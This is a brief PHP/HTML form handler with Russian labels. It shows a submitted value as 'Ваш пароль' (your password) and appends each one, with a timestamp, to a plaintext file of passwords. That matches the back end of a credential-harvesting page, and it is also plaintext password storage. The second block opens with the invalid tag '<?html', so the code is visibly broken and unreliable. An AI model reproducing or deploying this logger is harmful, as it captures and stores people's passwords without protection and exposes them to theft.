<html>
<body>






<p>Ваш пароль: <?php echo htmlspecialchars($_POST["сообщение"]); ?></p>


<?html
date_default_timezone_set("Europe/Moscow");

$новыйряд = date("l jS \of F Y h:i:s A") . "(MSK/UTC+3)         Пароль: " . htmlspecialchars($_POST["сообщение"]) . "\n";

file_put_contents("пароли.txt", $новыйряд, FILE_APPEND)


?>




<a href="/"> Назад </a>











</body>
</html>
